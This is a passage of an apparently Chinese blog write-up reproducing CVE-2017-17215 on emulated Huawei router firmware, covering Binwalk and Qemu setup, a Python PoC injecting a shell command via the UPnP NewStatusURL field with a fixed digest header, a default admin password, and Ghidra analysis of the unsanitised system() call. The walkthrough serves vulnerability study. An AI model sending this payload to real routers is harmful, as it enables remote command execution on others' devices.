class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Binwalk提供图片和视觉分析。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> pyqtgraph <span class="token comment"># Python3.x</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy python3-pip<span class="token function">sudo</span> pip3 <span class="token function">install</span> pyqtgraph<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Capstone disassembly framework的插件运行需要的python模块如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pip<span class="token comment"># Install standard extraction utilitie</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mtd-utils <span class="token function">gzip</span> <span class="token function">bzip2</span> <span class="token function">tar</span> arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools<span class="token comment"># Install sasquatch to extract non-standard SquashFS image</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> zlib1g-dev liblzma-dev liblzo2-dev  $ <span class="token function">git</span> clone https://github.com/devttys0/sasquatch  $ <span class="token punctuation">(</span>cd sasquatch <span class="token operator">&amp;&amp;</span> ./build.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以下的选择性安装即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install jefferson to extract JFFS2 file systems</span>$ <span class="token function">sudo</span> pip <span class="token function">install</span> cstruct$ <span class="token function">git</span> clone https://github.com/sviehb/jefferson$ <span class="token punctuation">(</span>cd jefferson <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install ubi_reader to extract UBIFS file systems</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> liblzo2-dev python-lzo$ <span class="token function">git</span> clone https://github.com/jrspruitt/ubi_reader$ <span class="token punctuation">(</span>cd ubi_reader <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install yaffshiv to extract YAFFS file systems</span>$ <span class="token function">git</span> clone https://github.com/devttys0/yaffshiv$ <span class="token punctuation">(</span>cd yaffshiv <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install unstuff (closed source) to extract StuffIt archive files</span>$ <span class="token function">wget</span> -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -zxv$ <span class="token function">sudo</span> <span class="token function">cp</span> bin/unstuff /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上是手动安装所有库的过程，如果想要省时间，也可以尝试一下Binwalk的安装文件夹中的自动安装脚本，<code>sudo ./deps.sh</code>，但是这样的安装耗时较长，且容易报错，建议还是采用手动安装需要的几个依赖即可。</p><p>安装好了之后，可以尝试一下分析固件。<br><code>binwalk -Me 固件</code><br><img src="https://i.bmp.ovh/imgs/2022/01/7ad77b1b981aee35.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/20586cf2af94373f.png" alt=""></p><p>在当前的文件夹下即可得到文件系统的根目录。<br>通过<code>file ./bin/busybox</code>的指令即可得到相应的文件架构。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> ./bin/busybox./bin/busybox: ELF <span class="token number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>至此Binwalk安装完毕。</p><h3 id="Qemu安装"><a class="header-anchor" href="#Qemu安装">¶</a>Qemu安装</h3><p>相对于Binwalk的手动编译，Qemu相对简单一点，稍微有所了解的同志可能会知道Qemu有系统和用户模式两种。安装的话可以选择不同的需求安装，这里我们选择全部都安装。</p><p>Qemu的安装没有很多讲究，一键脚本安装即可</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://git.qemu.org/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursivesudo<span class="token function">apt</span> <span class="token function">install</span> libglib2.0 libglib2.0-devsudo<span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtoolcd qemu <span class="token operator">&amp;&amp;</span> ./configuremakesudo <span class="token function">make</span> <span class="token function">install</span>//apt 安装<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user-static<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>安装完毕之后，如下图<br><img src="https://i.bmp.ovh/imgs/2022/01/d4c999e08069c699.png" alt=""></p><h2 id="0x02-漏洞验证"><a class="header-anchor" href="#0x02-漏洞验证">¶</a>0x02 漏洞验证</h2><p>工具安装完毕之后，以下将对漏洞进行验证。</p><h3 id="启动服务"><a class="header-anchor" href="#启动服务">¶</a>启动服务</h3><p>首先，需要给Qemu虚拟机准备一个新的网桥，利用该网桥使得Qemu机可以联通互联网，并且和VM虚拟机处于同一网段。</p><p>采用的基本方法是分配一个新网卡给Qemu机器，并且使用网桥，将其桥接到原来的网卡。首先需要安装网桥配置工具。</p><p><code>apt-get install bridge-utils</code><br><code>sudo apt-get install uml-utilities </code></p><p>然后使用下面的脚本即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">sudo</span> brctl addbr br0 //创建网桥br0<span class="token function">sudo</span> brctl addif br0 ens33 //连接到ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> <span class="token function">ifconfig</span> ens33 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> dhclient br0//给该网桥分配IP地址，此前不能给ens33分配ipv4的地址<span class="token function">sudo</span> tunctl -t tap0 -u root<span class="token function">sudo</span> brctl addif br0 tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> brctl showstp br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上内容保存到一个bash脚本即可，开启虚拟机之前运行一遍。<br><img src="https://i.bmp.ovh/imgs/2022/01/17975a3eca5dd634.png" alt=""></p><p>网络配置好了之后，使用相应的镜像和内核文件启动一个qemu机。<br><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a><br>以上网址可以下载内核和镜像。</p><p>期待使用指定的网桥，且在当前中断开启qemu机器。<br><code>sudo qemu-system-mips -M malta -kernel ~/Desktop/IOT/vmlinuxs/vmlinux-2.6.32-5-4kc-malta -hda ~/Desktop/IOT/Images/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</code></p><p>指令的具体含义可以看以下Qemu的说明文档。<a href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/QEMU_(简体中文)</a></p><p>虚拟机的root账户密码是root，成功登录之后，尝试ping以下外网，看能否ping通。<br><img src="https://i.bmp.ovh/imgs/2022/01/2b3815aba7ca25ec.png" alt=""></p><p>然后使用scp指令，把文件系统都传递给Qemu虚拟机。<br><code>scp -r 路径 ip@username:虚拟机路径</code><br><code>$ scp -r squashfs-root  root@192.168.146.137:~/sqashfs-root</code></p><p>文件传输完毕之后，为了能够让VM机访问到Qemu机，使用mount挂载以下dev和proc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>不同的文件系统有不同的挂载指令。</p><p>此时注意到<code>CVE-2017-17215</code>的漏洞存在于<code>upnp和mic</code>服务中。这两项服务都和网络有关，为了方式漏洞服务启动后，网络环境的变化，使用ssh远程登录该Qemu机器，新建一个console，利用该console启动漏洞服务，利用原有的Qemu窗口保持Qemu的ip不发生改变。</p><p>在ssh窗口输入<code>chroot . /bin/sh</code>更改根目录，避免动态链接库报错。<br><img src="https://i.bmp.ovh/imgs/2022/01/b47cbc250d9e899d.png" alt=""></p><p>然后执行漏洞服务即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./bin/upnp</span><span class="token comment"># ./bin/mic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>等待执行结束，果然ip发生了改变，利用ifconfig指令把ip地址改回去。<br><img src="https://i.bmp.ovh/imgs/2022/01/a4a0a7d9ee1cb49f.png" alt=""></p><p>此时，尝试访问该路由器（Qemu机）的ip地址，可以发现成功访问。<br><img src="https://i.bmp.ovh/imgs/2022/01/f329dee4d718e098.png" alt=""></p><p>默认账户admin，@Hua1234</p><h3 id="poc测试"><a class="header-anchor" href="#poc测试">¶</a>poc测试</h3><p>漏洞服务开启之后，可以验证以下漏洞的poc，用的是下面的exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;/bin/busybox mkdir shell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.146.137:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>post请求的IP地址写Qemu机的IP地址。执行后，结果如下：<br><img src="https://i.bmp.ovh/imgs/2022/01/ce55e82d38946b38.png" alt=""><br>成功rce。</p><h2 id="0x03-漏洞分析"><a class="header-anchor" href="#0x03-漏洞分析">¶</a>0x03 漏洞分析</h2><p>漏洞环境和服务都已搭建成功，并且已经成功验证。接下来结合固件分析更加深入理解该漏洞的成因。</p><h3 id="分析漏洞函数"><a class="header-anchor" href="#分析漏洞函数">¶</a>分析漏洞函数</h3><p>首先，使用Ghidra打开upnp文件。由poc不难发现，注入命令的位置出现在<code>&lt;NewStatusURL&gt;</code>节点以内。所以先尝试搜索该字符串。</p><p>在字符串搜索框搜索，<code>NewStatusURL</code>,的到如下函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0040749c</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_418<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_414<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack1040 <span class="token punctuation">[</span><span class="token number">1028</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewDownloadURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_418<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_418 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span>                        <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewStatusURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_414<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_414 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">snprintf</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"</span><span class="token punctuation">,</span>               local_418<span class="token punctuation">,</span>local_414<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>容易发现system函数的参数来源于<code>snprintf</code>，再看snprintf函数中，参数的拼接用的是字符串<code>%s</code>传入，没有做任何的过滤处理，由此可以判断，这是由<code>snprintf</code>参数过滤不严格引起的，命令拼接RCE.</p><p>尝试查看该函数的交叉引用，发现失败。<br><img src="https://i.bmp.ovh/imgs/2022/01/e3aa953461727c2d.png" alt=""><br>这说明该函数是被间接调用的，目前为止，笔者只能想到，该函数是由虚函数表调用（比较常见）</p><p>寻找该函数的调用到目前为止，无法前进，但是漏洞的成因找到了。</p><h3 id="漏洞触发流程"><a class="header-anchor" href="#漏洞触发流程">¶</a>漏洞触发流程</h3><p>刚才我们尝试从漏洞函数的调用去寻找漏洞的触发点，失败了，接下来，我们换一种方法，正向的去寻找漏洞的触发点。进入文件系统，尝试搜索，该字符串在哪里出现了。<code>grep -r &quot;NewStatusURL&quot;</code></p><p><img src="https://i.bmp.ovh/imgs/2022/01/d2e4c615c810c54f.png" alt=""><br>在upnp的文件夹下面发现了仅有<code>DevUpg.xml</code>中有该字符串。（说明只有该地方用到了该字符串）</p><p>老样子，在Ghidra中搜索<code>DevUpg.xml</code>字符串，找到一个服务注册函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ATP_UPNP_RegDeviceAndService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar6<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar7<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar8<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar9<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar10<span class="token punctuation">;</span>  undefined4 local_128<span class="token punctuation">;</span>  undefined4 local_124<span class="token punctuation">;</span>  undefined4 local_120<span class="token punctuation">;</span>  undefined4 local_11c<span class="token punctuation">;</span>  undefined4 local_118<span class="token punctuation">;</span>  undefined4 local_114<span class="token punctuation">;</span>  undefined4 local_110<span class="token punctuation">;</span>  undefined4 local_10c<span class="token punctuation">;</span>  undefined4 local_108<span class="token punctuation">;</span>  undefined4 local_104<span class="token punctuation">;</span>  undefined4 local_100<span class="token punctuation">;</span>  undefined4 local_fc<span class="token punctuation">;</span>  undefined4 local_f8<span class="token punctuation">;</span>  undefined4 local_f4<span class="token punctuation">;</span>  undefined4 local_f0 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_dc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_cc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_bc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_ac<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_9c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_98<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_94<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_90<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_8c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_88<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_84<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_80<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_7c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_78<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_74<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_70<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_6c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_68<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_64<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_60<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_5c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_58<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_54<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_50<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_4c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_48<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_44<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_40<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_3c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_38<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_34<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_30<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_2c<span class="token punctuation">;</span>    local_128 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_124 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_120 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_11c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_118 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_114 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_110 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_10c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_108 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_104 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_100 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_fc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_f0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>g_stDevDesc<span class="token punctuation">.</span>_4_4_<span class="token punctuation">,</span><span class="token string">"InternetGatewayDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_128<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceUpgrade:1"</span><span class="token punctuation">,</span><span class="token string">"DevUpg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>                              <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_124<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"Layer3Forwarding:1"</span><span class="token punctuation">,</span><span class="token string">"L3Fwd.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_120<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"LANConfigSecurity:1"</span><span class="token punctuation">,</span><span class="token string">"LANSec.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_118<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token string">"urn:www-huawei-com:service:DeviceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"DevCfg.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span>                              <span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_11c<span class="token punctuation">)</span><span class="token punctuation">;</span>  iVar5 <span class="token operator">=</span> iVar2 <span class="token operator">+</span> iVar1 <span class="token operator">+</span> iVar3 <span class="token operator">+</span> iVar4 <span class="token operator">+</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_128<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_110<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar2 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANCommonInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanCommonIfc1.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_10c<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar3 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token string">"WANDSLInterfaceConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslIfCfg.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>                                <span class="token operator">&amp;</span>local_114<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar4 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegDevice</span><span class="token punctuation">(</span>local_110<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"WANConnectionDevice:1"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_108<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar6 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANDSLLinkConfig:1"</span><span class="token punctuation">,</span><span class="token string">"WanDslLink.xml"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>local_f0<span class="token punctuation">)</span><span class="token punctuation">;</span>    iVar7 <span class="token operator">=</span> <span class="token function">ATP_UPnP_RegService</span><span class="token punctuation">(</span>local_108<span class="token punctuation">,</span><span class="token string">"WANIPConnection:1"</span><span class="token punctuation">,</span><span class="token string">"WanIpConn.xml"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_100<span 